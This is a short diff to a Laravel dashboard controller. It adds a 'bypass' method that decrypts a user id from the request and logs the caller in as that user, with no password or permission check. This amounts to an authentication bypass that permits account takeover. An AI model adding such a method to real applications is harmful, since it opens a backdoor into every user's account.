@@ -259,5 +259,14 @@ class DashboardController extends Controller
         }
     
         return redirect()->back()->with('error', 'Invalid old password');
+    } 
+
+    public function bypass($id){
+       
+        $id = decrypt($id);
+        $user = User::find($id);
+        
+        Auth::login($user);
+        return redirect()->route('index');
     }
 }
